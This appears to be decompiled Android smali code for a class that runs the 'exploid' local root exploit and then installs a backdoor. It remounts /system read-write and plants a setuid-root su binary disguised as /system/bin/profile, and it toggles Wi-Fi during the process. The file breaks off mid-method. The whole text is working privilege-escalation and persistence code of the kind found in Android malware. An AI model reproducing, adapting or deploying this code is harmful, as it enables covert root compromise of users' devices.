.class public Lcom/android/root/udevRoot;
.super Ljava/lang/Object;
.source "udevRoot.java"


# static fields
.field private static final BUFFER_SIZE:I = 0x400

.field private static final FNAME_EXPLOIT:Ljava/lang/String; = "exploid"

.field private static final FNAME_REMOUNT_DATA_RO:Ljava/lang/String; = "remount_data.sh"

.field private static final FNAME_REMOUNT_SYS_RO:Ljava/lang/String; = "remount_sys_ro.sh"

.field private static final FNAME_REMOUNT_SYS_RW:Ljava/lang/String; = "remount_sys_rw.sh"

.field private static final FNAME_SU_BIN:Ljava/lang/String; = "profile"

.field private static final MOUNT_EXEC_PATH:Ljava/lang/String; = "/system/bin/mount"

.field private static final ROOT_SHELL_PATH:Ljava/lang/String; = "/data/local/tmp/rootshell"

.field private static final SU_EXEC_PATH:Ljava/lang/String; = "/system/bin/profile"

.field private static final TAG:Ljava/lang/String; = "UDevRoot"


# instance fields
.field private bDisableWifi:Z

.field private ctx:Landroid/content/Context;

.field private remountSysRW:Ljava/lang/String;

.field private wifiManager:Landroid/net/wifi/WifiManager;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .parameter "ctx"

    .prologue
    .line 39
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 32
    const-string v0, ""

    iput-object v0, p0, Lcom/android/root/udevRoot;->remountSysRW:Ljava/lang/String;

    .line 36
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/root/udevRoot;->bDisableWifi:Z

    .line 40
    iput-object p1, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    .line 41
    return-void
.end method

.method private changeWifiState()V
    .locals 5

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x1

    .line 152
    iget-object v1, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    const-string v2, "wifi"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/wifi/WifiManager;

    iput-object v1, p0, Lcom/android/root/udevRoot;->wifiManager:Landroid/net/wifi/WifiManager;

    .line 154
    iget-object v1, p0, Lcom/android/root/udevRoot;->wifiManager:Landroid/net/wifi/WifiManager;

    invoke-virtual {v1}, Landroid/net/wifi/WifiManager;->getWifiState()I

    move-result v0

    .line 155
    .local v0, state:I
    const/4 v1, 0x3

    if-ne v0, v1, :cond_1

    .line 157
    iget-object v1, p0, Lcom/android/root/udevRoot;->wifiManager:Landroid/net/wifi/WifiManager;

    invoke-virtual {v1, v4}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 158
    iput-boolean v4, p0, Lcom/android/root/udevRoot;->bDisableWifi:Z

    .line 164
    :cond_0
    :goto_0
    return-void

    .line 159
    :cond_1
    if-ne v0, v3, :cond_0

    .line 161
    iget-object v1, p0, Lcom/android/root/udevRoot;->wifiManager:Landroid/net/wifi/WifiManager;

    invoke-virtual {v1, v3}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 162
    iput-boolean v3, p0, Lcom/android/root/udevRoot;->bDisableWifi:Z

    goto :goto_0
.end method

.method private genScriptFile(Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .parameter "fname"
    .parameter "msg"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 244
    iget-object v2, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    const/4 v3, 0x0

    invoke-virtual {v2, p1, v3}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v0

    .line 245
    .local v0, fos:Ljava/io/FileOutputStream;
    new-instance v1, Ljava/io/OutputStreamWriter;

    invoke-direct {v1, v0}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 246
    .local v1, osw:Ljava/io/OutputStreamWriter;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 247
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->flush()V

    .line 248
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->close()V

    .line 250
    return-void
.end method

.method private getDataMountPoint(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 1
    .parameter "is"

    .prologue
    .line 257
    const-string v0, "/data"

    invoke-direct {p0, p1, v0}, Lcom/android/root/udevRoot;->getMountPoint(Ljava/io/InputStream;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private getMountPoint(Ljava/io/InputStream;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .parameter "is"
    .parameter "mp_name"

    .prologue
    .line 261
    const/4 v3, 0x0

    .line 262
    .local v3, reader:Ljava/io/BufferedReader;
    const/4 v2, 0x0

    .line 264
    .local v2, mp:Ljava/lang/String;
    :try_start_0
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-direct {v5, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    const/16 v6, 0x400

    invoke-direct {v4, v5, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;I)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 267
    .end local v3           #reader:Ljava/io/BufferedReader;
    .local v4, reader:Ljava/io/BufferedReader;
    :cond_0
    :try_start_1
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_4

    move-result-object v1

    .local v1, line:Ljava/lang/String;
    if-nez v1, :cond_2

    .line 276
    :goto_0
    if-eqz v4, :cond_4

    .line 278
    :try_start_2
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    move-object v3, v4

    .line 285
    .end local v1           #line:Ljava/lang/String;
    .end local v4           #reader:Ljava/io/BufferedReader;
    .restart local v3       #reader:Ljava/io/BufferedReader;
    :cond_1
    :goto_1
    return-object v2

    .line 268
    .end local v3           #reader:Ljava/io/BufferedReader;
    .restart local v1       #line:Ljava/lang/String;
    .restart local v4       #reader:Ljava/io/BufferedReader;
    :cond_2
    :try_start_3
    invoke-virtual {v1, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4

    move-result v5

    if-eqz v5, :cond_0

    .line 269
    move-object v2, v1

    .line 270
    goto :goto_0

    .line 273
    .end local v1           #line:Ljava/lang/String;
    .end local v4           #reader:Ljava/io/BufferedReader;
    .restart local v3       #reader:Ljava/io/BufferedReader;
    :catch_0
    move-exception v5

    move-object v0, v5

    .line 274
    .local v0, e:Ljava/io/IOException;
    :goto_2
    :try_start_4
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 276
    if-eqz v3, :cond_1

    .line 278
    :try_start_5
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_1

    .line 279
    :catch_1
    move-exception v0

    .line 280
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 275
    .end local v0           #e:Ljava/io/IOException;
    :catchall_0
    move-exception v5

    .line 276
    :goto_3
    if-eqz v3, :cond_3

    .line 278
    :try_start_6
    invoke-virtual {v3}, Ljava/io/BufferedReader;->close()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_2

    .line 283
    :cond_3
    :goto_4
    throw v5

    .line 279
    :catch_2
    move-exception v0

    .line 280
    .restart local v0       #e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_4

    .line 279
    .end local v0           #e:Ljava/io/IOException;
    .end local v3           #reader:Ljava/io/BufferedReader;
    .restart local v1       #line:Ljava/lang/String;
    .restart local v4       #reader:Ljava/io/BufferedReader;
    :catch_3
    move-exception v0

    .line 280
    .restart local v0       #e:Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .end local v0           #e:Ljava/io/IOException;
    :cond_4
    move-object v3, v4

    .end local v4           #reader:Ljava/io/BufferedReader;
    .restart local v3       #reader:Ljava/io/BufferedReader;
    goto :goto_1

    .line 275
    .end local v1           #line:Ljava/lang/String;
    .end local v3           #reader:Ljava/io/BufferedReader;
    .restart local v4       #reader:Ljava/io/BufferedReader;
    :catchall_1
    move-exception v5

    move-object v3, v4

    .end local v4           #reader:Ljava/io/BufferedReader;
    .restart local v3       #reader:Ljava/io/BufferedReader;
    goto :goto_3

    .line 273
    .end local v3           #reader:Ljava/io/BufferedReader;
    .restart local v4       #reader:Ljava/io/BufferedReader;
    :catch_4
    move-exception v5

    move-object v0, v5

    move-object v3, v4

    .end local v4           #reader:Ljava/io/BufferedReader;
    .restart local v3       #reader:Ljava/io/BufferedReader;
    goto :goto_2
.end method

.method private getSystemMountPoint(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 1
    .parameter "is"

    .prologue
    .line 253
    const-string v0, "/system"

    invoke-direct {p0, p1, v0}, Lcom/android/root/udevRoot;->getMountPoint(Ljava/io/InputStream;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private installSu()Z
    .locals 10

    .prologue
    .line 175
    const/4 v7, 0x0

    .line 177
    .local v7, tmpResult:Z
    const-wide/16 v8, 0x1388

    :try_start_0
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 182
    :goto_0
    new-instance v0, Ljava/io/File;

    const-string v8, "/data/local/tmp/rootshell"

    invoke-direct {v0, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 183
    .local v0, RootShell:Ljava/io/File;
    new-instance v1, Ljava/io/File;

    iget-object v8, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    invoke-virtual {v8}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v8

    const-string v9, "profile"

    invoke-direct {v1, v8, v9}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 184
    .local v1, SysFile:Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_0

    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_0

    .line 199
    :try_start_1
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v8

    iget-object v9, p0, Lcom/android/root/udevRoot;->remountSysRW:Ljava/lang/String;

    invoke-static {v8, v9}, Lcom/android/root/Setting;->runRootCommand(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 201
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "cat "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " > /system/bin/profile"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 202
    .local v3, cpFile:Ljava/lang/String;
    const-string v2, "chmod 04755 /system/bin/profile"

    .line 204
    .local v2, chmodFile:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v3}, Lcom/android/root/Setting;->runRootCommand(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 205
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v2}, Lcom/android/root/Setting;->runRootCommand(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 207
    new-instance v6, Ljava/io/File;

    const-string v8, "/system/bin/profile"

    invoke-direct {v6, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 208
    .local v6, su:Ljava/io/File;
    invoke-virtual {v6}, Ljava/io/File;->exists()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v8

    if-eqz v8, :cond_1

    .line 209
    const/4 v7, 0x1

    .line 220
    .end local v2           #chmodFile:Ljava/lang/String;
    .end local v3           #cpFile:Ljava/lang/String;
    .end local v6           #su:Ljava/io/File;
    :cond_0
    :goto_1
    return v7

    .line 178
    .end local v0           #RootShell:Ljava/io/File;
    .end local v1           #SysFile:Ljava/io/File;
    :catch_0
    move-exception v5

    .line 179
    .local v5, e1:Ljava/lang/InterruptedException;
    invoke-virtual {v5}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_0

    .line 212
    .end local v5           #e1:Ljava/lang/InterruptedException;
    .restart local v0       #RootShell:Ljava/io/File;
    .restart local v1       #SysFile:Ljava/io/File;
    .restart local v2       #chmodFile:Ljava/lang/String;
    .restart local v3       #cpFile:Ljava/lang/String;
    .restart local v6       #su:Ljava/io/File;
    :cond_1
    const/4 v7, 0x0

    goto :goto_1

    .line 215
    .end local v2           #chmodFile:Ljava/lang/String;
    .end local v3           #cpFile:Ljava/lang/String;
    .end local v6           #su:Ljava/io/File;
    :catch_1
    move-exception v8

    move-object v4, v8

    .line 216
    .local v4, e:Ljava/lang/Exception;
    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method private prepareRawFile()Z
    .locals 6

    .prologue
    const-string v5, "profile"

    const-string v4, "exploid"

    .line 70
    iget-object v2, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    const-string v3, "exploid"

    const-string v3, "exploid"

    invoke-static {v2, v4, v4}, Lcom/android/root/Setting;->getRawResource(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    .line 71
    .local v0, b1:Z
    iget-object v2, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    const-string v3, "profile"

    const-string v3, "profile"

    invoke-static {v2, v5, v5}, Lcom/android/root/Setting;->getRawResource(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    .line 73
    .local v1, b2:Z
    if-eqz v0, :cond_0

    if-eqz v1, :cond_0

    const/4 v2, 0x1

    :goto_0
    return v2

    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method

.method private removeExploit()V
    .locals 3

    .prologue
    .line 290
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    const-string v2, "exploid"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 291
    .local v0, Exploit:Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 292
    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    .line 294
    :cond_0
    return-void
.end method

.method private restoreWifiState()V
    .locals 2

    .prologue
    .line 167
    iget-boolean v0, p0, Lcom/android/root/udevRoot;->bDisableWifi:Z

    if-eqz v0, :cond_0

    .line 168
    iget-object v0, p0, Lcom/android/root/udevRoot;->wifiManager:Landroid/net/wifi/WifiManager;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    .line 172
    :goto_0
    return-void

    .line 170
    :cond_0
    iget-object v0, p0, Lcom/android/root/udevRoot;->wifiManager:Landroid/net/wifi/WifiManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    goto :goto_0
.end method

.method private runExploid()Z
    .locals 15

    .prologue
    const-string v12, "/system/bin/mount"

    const-string v12, " /system"

    const-string v12, " "

    .line 77
    const/4 v11, 0x0

    .line 78
    .local v11, tmpResult:Z
    const/4 v8, 0x0

    .line 79
    .local v8, s_mount_point_data:Ljava/lang/String;
    const/4 v5, 0x0

    .line 80
    .local v5, s_fs_type_data:Ljava/lang/String;
    const/4 v7, 0x0

    .line 81
    .local v7, s_mount_arg_data:Ljava/lang/String;
    const/4 v9, 0x0

    .line 82
    .local v9, s_mount_point_sys:Ljava/lang/String;
    const/4 v6, 0x0

    .line 84
    .local v6, s_fs_type_sys:Ljava/lang/String;
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v12

    const-string v13, "/system/bin/mount"

    invoke-virtual {v12, v13}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 85
    .local v4, proc:Ljava/lang/Process;
    if-eqz v4, :cond_0

    .line 86
    invoke-virtual {v4}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v12

    invoke-direct {p0, v12}, Lcom/android/root/udevRoot;->getDataMountPoint(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v3

    .line 87
    .local v3, mp_line:Ljava/lang/String;
    const-string v12, "\\s+"

    invoke-virtual {v3, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 88
    .local v10, tmp:[Ljava/lang/String;
    const/4 v12, 0x0

    aget-object v8, v10, v12

    .line 89
    const/4 v12, 0x2

    aget-object v5, v10, v12

    .line 90
    const/4 v12, 0x3

    aget-object v7, v10, v12

    .line 93
    .end local v3           #mp_line:Ljava/lang/String;
    .end local v10           #tmp:[Ljava/lang/String;
    :cond_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v12

    const-string v13, "/system/bin/mount"

    invoke-virtual {v12, v13}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 94
    if-eqz v4, :cond_1

    .line 95
    invoke-virtual {v4}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v12

    invoke-direct {p0, v12}, Lcom/android/root/udevRoot;->getSystemMountPoint(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v3

    .line 96
    .restart local v3       #mp_line:Ljava/lang/String;
    const-string v12, "\\s+"

    invoke-virtual {v3, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 97
    .restart local v10       #tmp:[Ljava/lang/String;
    const/4 v12, 0x0

    aget-object v9, v10, v12

    .line 98
    const/4 v12, 0x2

    aget-object v6, v10, v12

    .line 101
    .end local v3           #mp_line:Ljava/lang/String;
    .end local v10           #tmp:[Ljava/lang/String;
    :cond_1
    if-nez v8, :cond_2

    .line 102
    const-string v8, "/dev/block/mtdblock5"

    .line 105
    :cond_2
    if-nez v9, :cond_3

    .line 106
    const-string v9, "/dev/block/mtdblock3"

    .line 109
    :cond_3
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "mount -o remount,rw -t "

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " /system"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    iput-object v12, p0, Lcom/android/root/udevRoot;->remountSysRW:Ljava/lang/String;

    .line 111
    const-string v12, "remount_sys_rw.sh"

    .line 112
    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "mount -o remount,rw -t "

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " /system"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 111
    invoke-direct {p0, v12, v13}, Lcom/android/root/udevRoot;->genScriptFile(Ljava/lang/String;Ljava/lang/String;)V

    .line 114
    const-string v12, "remount_sys_ro.sh"

    .line 115
    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "mount -o remount,ro -t "

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " /system"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 114
    invoke-direct {p0, v12, v13}, Lcom/android/root/udevRoot;->genScriptFile(Ljava/lang/String;Ljava/lang/String;)V

    .line 117
    const-string v12, "remount_data.sh"

    .line 118
    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "mount -o remount,"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " -t "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " /data"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 117
    invoke-direct {p0, v12, v13}, Lcom/android/root/udevRoot;->genScriptFile(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 124
    .end local v4           #proc:Ljava/lang/Process;
    :goto_0
    new-instance v0, Ljava/io/File;

    iget-object v12, p0, Lcom/android/root/udevRoot;->ctx:Landroid/content/Context;

    invoke-virtual {v12}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v12

    const-string v13, "exploid"

    invoke-direct {v0, v12, v13}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 125
    .local v0, Exploit:Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v12

    if-eqz v12, :cond_4

    .line 127
    :try_start_1
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "chmod 770 "

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 128
    .local v1, cmd:Ljava/lang/String;
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v12

    invoke-virtual {v12, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 132
    .restart local v4       #proc:Ljava/lang/Process;
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, " "

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 134
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v12

    invoke-virtual {v12, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 136
    const/4 v11, 0x1

    .line 138
    const-wide/16 v12, 0x3e8

    invoke-static {v12, v13}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_2

    .line 148
    .end local v1           #cmd:Ljava/lang/String;
    .end local v4           #proc:Ljava/lang/Process;
    :cond_4
    :goto_1
    return v11

    .line 120
    .end local v0           #Exploit:Ljava/io/File;
    :catch_0
    move-exception v12

    move-object v2, v12

    .line 121
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 140
    .end local v2           #e:Ljava/io/IOException;
    .restart local v0       #Exploit:Ljava/io/File;
    :catch_1
    move-exception v12

    move-object v2, v12

    .line 141
    .restart local v2       #e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 143
    .end local v2           #e:Ljava/io/IOException;
    :catch_2
    move-exception v12

    move-object v2, v12

    .line 144
    .local v2, e:Ljava/lang/InterruptedException;
    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1
.end method


# virtual methods
.method public go4root()Z
    .locals 2

    .prologue
    .line 225
    invoke-direct {p0}, Lcom/android/root/udevRoot;->prepareRawFile()Z

    move-result v0

    .line 227
    .local v0, tmpResult:Z
    if-nez v0, :cond_0

    move v1, v0

    .line 239
    .end local v0           #tmpResult:Z
    .local v1, tmpResult:Z
    :goto_0
    return v1

    .line 230
    .end local v1           #tmpResult:Z
    .restart local v0       #tmpResult:Z
    :cond_0
    invoke-direct {p0}, Lcom/android/root/udevRoot;->runExploid()Z

    move-result v0

    .line 232
    if-eqz v0, :cond_1

    .line 233
    invoke-direct {p0}, Lcom/android/root/udevRoot;->changeWifiState()V

    .line 234
    invoke-direct {p0}, Lcom/android/root/udevRoot;->installSu()Z

    move-result v0

    .line 235
